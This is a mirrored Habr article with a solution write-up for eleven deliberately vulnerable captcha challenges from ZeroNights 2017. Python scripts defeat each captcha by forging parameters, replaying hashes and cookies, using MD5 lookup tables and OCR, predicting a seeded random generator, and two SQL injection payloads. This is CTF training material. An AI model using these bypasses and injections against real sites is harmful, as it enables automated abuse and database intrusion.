<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Challenges with ZeroNights 2017: Become the king of captcha</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="This year, at the ZeroNights IB conference, SberTech's department for testing information security of applications offered ZeroNights participants to ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Challenges with ZeroNights 2017: Become the king of captcha</h1><div class="post__text post__text-html js-mediator-article">  This year, at the ZeroNights IB conference, SberTech's department for testing information security of applications offered ZeroNights participants to look for vulnerabilities in various captcha implementations.  In total, we gave 11 examples with logical or program errors that allow solving many captchas in a short time.  In each round, participants were required to ‚Äúsolve‚Äù 20 captchas in 10 seconds and at the same time gain the necessary percentage of correct answers. <br><br>  We invite you to participate too.  In the post we will post links to all the tasks created by <a href="https://habrahabr.ru/users/fryday/" class="user_link">fryday</a> , and below them in the spoilers - write-up of the <a href="https://habrahabr.ru/users/liro/" class="user_link">Liro</a> participant with the correct answers. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/6bf/1c9/6e9/6bf1c96e9e25f2626d6f04950f09f8cd.png"></div><br><a name="habracut"></a><br>  To access the tasks you need to <a href="http://captcha.cf/register">register</a> on the site with the tasks.  It will not take a lot of time - there are no confirmation letters, after entering your data, you can log in immediately. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h2>  <a href="http://captcha.cf/challenge/1">Warm-up</a> exercise: "Ciferka" </h2><br>  This task is intended to familiarize yourself with the interface.  At the beginning of each task a brief description will be given, the total number of captchs, the required percentage of correctly entered captchas and the solution time, as well as the points earned.  By the number of points you can roughly estimate the complexity of the task. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/466/0dc/57f/4660dc57f4f93008dc587dd1fa61af50.png"><br><br><h2>  <a href="http://captcha.cf/challenge/2">Task 2</a> : "A little bit greeky" </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/98b/437/b38/98b437b3879728bae5b2fde6d7f522e1.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  In this task, we are each invited to enter a ‚Äúconscious‚Äù word.  Quickly google - it turns out that these are the names of gods from Greek mythology.  After entering several captchas and viewing the image code, we note that each time the number of the image changes: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/37f/15f/00e/37f15f00e3b77fec52035a598b6694f7.jpg"><br><br>  It can be assumed that the number of pictures is limited.  The page code contains directly links to the captchas themselves.  We unload them with our hands - just 16 turned out. <br>  We have a finite number of pictures with numbers from 1 to 16, where each number corresponds to the name of a particular character.  Now it remains for each request to find the captcha number in the code of the page and send the necessary character corresponding to this number: <br><br><pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal2</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>    <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">load_captcha_images</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>        url = <span class="hljs-string"><span class="hljs-string">"http://captcha.cf/static/ciferki/{}.png"</span></span>        <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>):            resp = requests.get(url.format(i))            <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(<span class="hljs-string"><span class="hljs-string">'captcha1/{}.png'</span></span>.format(i), <span class="hljs-string"><span class="hljs-string">'wb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> f:                f.write(resp.content)    gods = <span class="hljs-string"><span class="hljs-string">'Zeus Hera Aphrodite Apollo Ares Leto Athena Phobos Dionysus Hades Triton Hermes    Eos Poseidon Morpheus'</span></span>    captcha_solutions = gods.split()     resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/2/start'</span></span>, proxies=proxies)     resp = s.get(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/2'</span></span>, proxies=proxies)     <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">50</span></span>):        captcha_match = re.search(<span class="hljs-string"><span class="hljs-string">r'&lt;img src="/static/ciferki/(\d+).png"/&gt;'</span></span>, resp.text)        <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> captcha_match:            print(resp.text)        captcha_num = int(captcha_match.group(<span class="hljs-number"><span class="hljs-number">1</span></span>))        print(<span class="hljs-string"><span class="hljs-string">'captcha_num:'</span></span>, captcha_num)        resp = s.post(            <span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>,            data={<span class="hljs-string"><span class="hljs-string">'answer'</span></span>: captcha_solutions[captcha_num - <span class="hljs-number"><span class="hljs-number">1</span></span>]},            proxies=proxies)</code> </pre> <br></div></div><br><h2>  <a href="http://captcha.cf/challenge/3">Task 3</a> : "One, two, three ..." </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/1b4/f1a/749/1b4f1a749716eb99f5d880305d0a3ba2.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  If you carefully read the task, you can notice one oddity - we need only 24% of the correct answers for successful completion.  Remember this and continue our search. <br><br>  In all the captcha of this assignment, we are asked to enter the result of summing up some numbers.  After passing all the captchas, it becomes clear that only numbers from 1 to 4 are used in the summation. <br><br>  Let's look through all possible combinations that may appear, based on our conjectures that the numbers above 4 are not used in total: <br><br><table><tbody><tr><td>  1 + 1 = 2 <br></td><td>  2 + 1 = 3 <br></td><td>  3 + 1 = 4 <br></td><td>  4 + 1 = 5 <br></td></tr><tr><td>  1 + 2 = 3 <br></td><td>  2 + 2 = 4 <br></td><td>  3 + 2 = 5 <br></td><td>  4 + 2 = 6 <br></td></tr><tr><td>  1 + 3 = 4 <br></td><td>  2 + 3 = 5 <br></td><td>  3 + 3 = 6 <br></td><td>  4 + 3 = 7 <br></td></tr><tr><td>  1 + 4 = 5 <br></td><td>  2 + 4 = 6 <br></td><td>  3 + 4 = 7 <br></td><td>  4 + 4 = 8 <br></td></tr></tbody></table><br>  The most frequent result of the sum is 5, exactly 25% of all sums.  The condition is 24% correct captchas, so if we set ‚Äú5‚Äù as the answer for everyone, then we solve the problem: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal3</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>   resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/3/start'</span></span>, proxies=proxies)   <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">20</span></span>):       resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>, data={<span class="hljs-string"><span class="hljs-string">'answer'</span></span>: <span class="hljs-number"><span class="hljs-number">5</span></span>}, proxies=proxies)   time.sleep(<span class="hljs-number"><span class="hljs-number">65</span></span>)</code> </pre><br></div></div><br><h2>  <a href="http://captcha.cf/challenge/4">Task 4</a> : "We need to go deeper" </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/597/2e8/97e/5972e897e860f7f212e97c28d547f492.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  Look at the page code and see the obfuscated JavaScript there.  Most likely, this code checks the correctness of the entered captcha.  Check your theory with the Burp Suite: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/3b4/dbb/7fa/3b4dbb7facf33d26841f57ce0a72db45.png"><br><br>  In addition to the entered captcha, the ‚Äúcorrect‚Äù parameter equal to 1 is also sent to the server. That is, you can trick the server by sending the same captcha value to it each time, while adding the correct parameter: <br><br><pre> <code class="python hljs">&lt;b&gt;<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function">&lt;/</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">&gt; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal4</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>   resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/4/start'</span></span>, proxies=proxies)   &lt;b&gt;<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>&lt;/b&gt; i &lt;b&gt;<span class="hljs-keyword"><span class="hljs-keyword">in</span></span>&lt;/b&gt; range(<span class="hljs-number"><span class="hljs-number">20</span></span>):       &lt;b&gt;<span class="hljs-keyword"><span class="hljs-keyword">print</span></span>&lt;/b&gt;(i)       s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>, data={<span class="hljs-string"><span class="hljs-string">'answer'</span></span>: <span class="hljs-string"><span class="hljs-string">'0C8X4'</span></span>, <span class="hljs-string"><span class="hljs-string">'correct'</span></span>: <span class="hljs-string"><span class="hljs-string">'1'</span></span>}, allow_redirects=<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, proxies=proxies)</code> </pre><br></div></div><br><h2>  <a href="http://captcha.cf/challenge/5">Task 5</a> : "Promzona" </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/788/54b/ded/78854bdedf12014368114ca90b0b81f2.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  Visual analysis of the captcha gives nothing, so we used the Burp Suite to analyze: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/853/06e/b98/85306eb98a26e0d4687cdbbb4797e0e8.png"><br><br>  As it turned out, in addition to the response to the captcha, the ‚Äúkod‚Äù parameter is also sent to the server, which is stored in the page code: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e90/339/26a/e9033926ab6e51eafa2c3c76438563f7.jpg"><br><br>  It is not hard to guess that the ‚Äúkod‚Äù parameter is the md5 hash of the answer.  Thus, we send the correct answer / kod pair to the server 20 times, and the task counts: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal5</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/5/start'</span></span>, proxies=proxies) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">20</span></span>): print(i) s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>, data={<span class="hljs-string"><span class="hljs-string">'answer'</span></span>: <span class="hljs-string"><span class="hljs-string">'55'</span></span>, <span class="hljs-string"><span class="hljs-string">'kod'</span></span>:<span class="hljs-string"><span class="hljs-string">'b53b3a3d6ab90ce0268229151c9bde11'</span></span>}, allow_redirects=<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, proxies=proxies)</code> </pre><br></div></div><br><h2>  <a href="http://captcha.cf/challenge/6">Task 6</a> : "Dispersion" </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/373/dd9/80e/373dd980edadd3ffffd0db4532c31bd8.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  When entering a captcha, we noticed that the captcha length is always five characters, and it uses only capital letters and numbers.  Looking through the code, we also see that the name of the captcha image is the md5 hash of its characters. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/bef/d4b/980/befd4b98057645a3261515d10bcf2738.jpg"><br><br>  Analysis through Burp Suite shows that we need only the answer field, which is the answer to the captcha. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/450/276/b43/450276b430260cfc64dc7ed2d2fa77ff.jpg"><br><br>  Things are easy, pull the necessary hash value out of the page code and restore the captcha value using it.  However, the inverse function of hashing is difficult to compute, so let's go the other way.  We will make a table of pairs of all possible caps (only capital letters and numbers, captcha is always 5 characters long) and the values ‚Äã‚Äãof md5 hashes from them; we will search for the required captcha value by hash: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal6</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/6/start'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">20</span></span>): m = re.search(<span class="hljs-string"><span class="hljs-string">r'static/regenbogen/(.*?)\.png'</span></span>, resp.text) hash_ = m.group(<span class="hljs-number"><span class="hljs-number">1</span></span>) word = sh.grep(hash_, <span class="hljs-string"><span class="hljs-string">'md5_tables/'</span></span> + hash_[<span class="hljs-number"><span class="hljs-number">0</span></span>] + <span class="hljs-string"><span class="hljs-string">'.md5'</span></span>).split(<span class="hljs-string"><span class="hljs-string">':'</span></span>)[<span class="hljs-number"><span class="hljs-number">1</span></span>].strip() print(hash_, word) resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>, data={<span class="hljs-string"><span class="hljs-string">'answer'</span></span>: word})</code> </pre><br>  To complete the task, it was necessary to write additional functions: <br><br><ul><li>  we generated all possible md5 hashes for 5-character responses consisting of capital letters and numbers; <br></li><li>  To complete the task at a specified time, we sorted all the hashes by the first character.  Those.  we look at the first character of the captcha hash, open the necessary sorting block and search it only in this block. <br></li></ul><br><pre> <code class="python hljs">alphabet = string.ascii_lowercase + string.digits <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">gen_md5_table</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>   a = string.ascii_uppercase + string.digits   table = itertools.product(a, repeat=<span class="hljs-number"><span class="hljs-number">5</span></span>)   f = open(<span class="hljs-string"><span class="hljs-string">'md5_table'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>)   <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> table:        s = hashlib.md5(bytes(<span class="hljs-string"><span class="hljs-string">''</span></span>.join(i), <span class="hljs-string"><span class="hljs-string">'ascii'</span></span>)).hexdigest() + <span class="hljs-string"><span class="hljs-string">':'</span></span> + <span class="hljs-string"><span class="hljs-string">''</span></span>.join(i)       print(s)       f.write(s + <span class="hljs-string"><span class="hljs-string">'\n'</span></span>)       f.close() &lt;i&gt;<span class="hljs-comment"><span class="hljs-comment"># call gen_md5_table # in bash: sort md5_table &gt; md5_sorted # in bash: mkdir md5_tables # call split_to_files&lt;/i&gt; def split_to_files(): file_handlers = {} for a in alphabet:   file_handlers[a] = open('md5_tables/' + a +'.md5', 'w') with open('md5_sorted') as f:   for line in f:       file_handlers[line[0]].write(line)</span></span></code> </pre><br></div></div><br><h2>  <a href="http://captcha.cf/challenge/7">Task 7</a> : "Four rooms" </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/ed0/6bb/e2a/ed06bbe2a9edcd51f2dec5cb1d8bb7f4.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  To our surprise, instead of incomprehensible, difficult to read characters, we see in the task a beautiful, absolutely clear picture: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/6c6/6cb/c53/6c66cbc53962b230bd7884a235e5bfd5.jpg"><br><br>  Due to the readability of the picture, you can use optical character recognition technology.  In python3, the pytesseract OCR module.  I had to slightly correct the function by removing possible spaces from the readable text, which are not implied when entering a captcha. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal7</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>   s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/7/start'</span></span>, proxies=proxies)   <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">21</span></span>):       resp = s.get(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha/image'</span></span>, proxies=proxies)       image_name = <span class="hljs-string"><span class="hljs-string">'/tmp/{}.png'</span></span>.format(i)       <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(image_name, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> f:           f.write(resp.content)       text = pytesseract.image_to_string(Image.open(image_name), config=<span class="hljs-string"><span class="hljs-string">'psm -7'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">' '</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>)       print(<span class="hljs-string"><span class="hljs-string">'text:'</span></span>, text)       s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>, data={<span class="hljs-string"><span class="hljs-string">'answer'</span></span>: text}, allow_redirects=<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, proxies=proxies)</code> </pre><br></div></div><br><h2>  <a href="http://captcha.cf/challenge/8">Task 8</a> : "Strategic Explorations of Exoplanets and Disks with Subaru" </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/22c/14b/d3d/22c14bd3db2873c3627ec71590e57205.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  Before us seems to be the usual terrible captcha.  Let's see the picture code: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/7d1/074/52d/7d107452d17ac7ea33fb598ca5b44a7e.jpg"><br><br>  The numbers are increasing, but no sequences are seen for entering captcha.  After some deliberation it becomes clear: time corresponds to our conditions.  This is a parameter that gradually increases, but the dependence does not lie on the surface here, since it is impossible to perform actions at ideally equal periods of time manually. <br><br>  The number on the captcha is a modification of the time specified in the page code.  One of the uses of time is to initialize a random number generator.  We noticed that the captcha numbers were in the range from 10,000 to 100,000. These boundaries were set to generate random numbers. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal8</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>   resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/8/start'</span></span>, proxies=proxies)   <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">20</span></span>):       m = re.search(<span class="hljs-string"><span class="hljs-string">r'/static/random/42_(\d+).png'</span></span>, resp.text)       r = m.group(<span class="hljs-number"><span class="hljs-number">1</span></span>)       random.seed(int(r))       print(<span class="hljs-string"><span class="hljs-string">'r:'</span></span>, r)       ans = random.randrange(<span class="hljs-number"><span class="hljs-number">10000</span></span>,<span class="hljs-number"><span class="hljs-number">100000</span></span>)       resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>, data={<span class="hljs-string"><span class="hljs-string">'answer'</span></span>: ans}, proxies=proxies)</code> </pre><br></div></div><br><h2>  <a href="http://captcha.cf/challenge/9">Assignment 9</a> : Watson </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/879/383/b8d/879383b8d0e4325ec344d787d6fad5be.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  Let's start right away with Burp Suite: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/dce/839/72b/dce83972b009eb20bf0e04a6b9a40855.jpg"><br><br>  This task is more complicated.  In addition to the ‚Äúanswer‚Äù field, there is nothing, which means you need to look for a solution somewhere else.  After some research, we came to the analysis of the sent cookie value.  Note that their value is very similar to the information encoded in base64.  Check it out: <br><br>  The "captcha" field indicates that the validity of the captcha is confirmed using a cookie.  That is, for a certain session and a certain ‚Äúanswer‚Äù field, our answer will always be considered correct: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/861/43b/b1d/86143bb1d7012582533d743360639eae.jpg"><br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal9</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>   resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/9/start'</span></span>, proxies=proxies)   <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">20</span></span>):       cookies = {<span class="hljs-string"><span class="hljs-string">'session'</span></span>:<span class="hljs-string"><span class="hljs-string">'eyJjYXB0Y2hhIjoiZjhkYTJlYjY4ZmU2YmRjZmY4YTk1NzJiNjMxNGQ2YmMiLCJ1c2VybmFtZSI6ImRtaXRyeS5tYW50aXNAZ21haWwuY29tIn0.DO94IQ.gHUIa3tyIgQ-JdpQ-O0GwUerTSI'</span></span>}       requests.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>, data={<span class="hljs-string"><span class="hljs-string">'answer'</span></span>: <span class="hljs-string"><span class="hljs-string">'ICF4G'</span></span>}, allow_redirects=<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, proxies=proxies, cookies=cookies)</code> </pre><br></div></div><br><h2>  <a href="http://captcha.cf/challenge/10">Task 10</a> : ‚ÄúMedicine‚Äù </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/38c/fc3/78a/38cfc378a334fba47f4305a2cbd4855c.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  To successfully complete the task, you must run a SQL injection in the answer parameter.  The query logic consists in comparing the captcha result from the captcha table from the database c of the captcha received from the user.  Based on this, let's pass on the answer parameter: <br><br><pre> <code class="python hljs"><span class="hljs-number"><span class="hljs-number">11111</span></span><span class="hljs-string"><span class="hljs-string">' union select result from sqli.captcha where id='</span></span>&lt;id_from_page_here&gt;<span class="hljs-string"><span class="hljs-string">' -- 1</span></span></code> </pre> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/98f/904/abb/98f904abbf6a49051fd65e0c6612f39c.jpg"><br><br>  We automate the process of operation: <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal10</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>   resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/10/start'</span></span>)   <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">20</span></span>):        m = re.search(<span class="hljs-string"><span class="hljs-string">r'name="id" value="(.*?)"&gt;'</span></span>, resp.text)        id_ = m.group(<span class="hljs-number"><span class="hljs-number">1</span></span>)       print(id_)       data = {      <span class="hljs-string"><span class="hljs-string">'answer'</span></span>: <span class="hljs-string"><span class="hljs-string">"asdadsdsa' union select result from sqli.captcha where id='{}' ‚Äî 1"</span></span>.format(id_),      <span class="hljs-string"><span class="hljs-string">'id'</span></span>: id_   }       resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>, data=data)</code> </pre><br></div></div><br><h2>  <a href="http://captcha.cf/challenge/11">Task 11</a> : "Poliklinika" </h2><br><img src="https://habrastorage.org/getpro/habr/post_images/05a/ca2/68b/05aca268b3a03147f41eff1c8d40de2a.png"><br><br><div class="spoiler">  <b class="spoiler_title">Decision</b> <div class="spoiler_text">  Sometimes task composers draw analogies between the names of the tasks themselves and ways to solve the problem.  The medical theme worked in the past task.  The name Poliklinika also prompts attempts to use SQL injections to solve a problem.  To begin, our task will run through Burp: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/846/46a/855/84646a85585ee1a0c2da79cc7b6099c3.jpg"><br><br>  Again we need two fields - ‚Äúanswer‚Äù and ‚Äúid‚Äù.  The second parameter can be obtained from the page code: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/eac/b30/ac5/eacb30ac58454bfedb6f956612814d75.jpg"><br><br>  You can see that the SQL query logic is something like <br><br>  <i>SELECT id FROM captcha_table WHERE captcha = '$ captcha'</i> <br><br>  with further verification of the result with the id parameter of the request. <br>  We change the logic of the request, giving in the parameter with the captcha <i>anything 'or id =' id_parsed_from_page_body.</i>  Thanks to the logical OR, the request will be executed successfully and the received id from the database will match the id transmitted in the request. <br><br>  Check by running an SQL injection on the captcha input: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f7d/d7e/a56/f7dd7ea56fcf0d884920df79ff4e3c0c.png"><br><br>  The operation was successful, it remains only to automate the delivery of results. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chal11</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span>   resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/challenge/11/start'</span></span>, proxies=proxies)   <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">20</span></span>):       m = re.search(<span class="hljs-string"><span class="hljs-string">r'name="id" value="(.*?)"&gt;'</span></span>, resp.text)       cid = m.group(<span class="hljs-number"><span class="hljs-number">1</span></span>)      data = { <span class="hljs-string"><span class="hljs-string">'answer'</span></span>: <span class="hljs-string"><span class="hljs-string">"asdadsdsa' or id='{}' -- 1"</span></span>.format(cid), <span class="hljs-string"><span class="hljs-string">'id'</span></span>: cid}      resp = s.post(<span class="hljs-string"><span class="hljs-string">'http://captcha.cf/captcha'</span></span>, data=data, proxies=proxies)</code> </pre><br></div></div></div><p>Source: <a href="https://habr.com/ru/post/344816/">https://habr.com/ru/post/344816/</a></p>
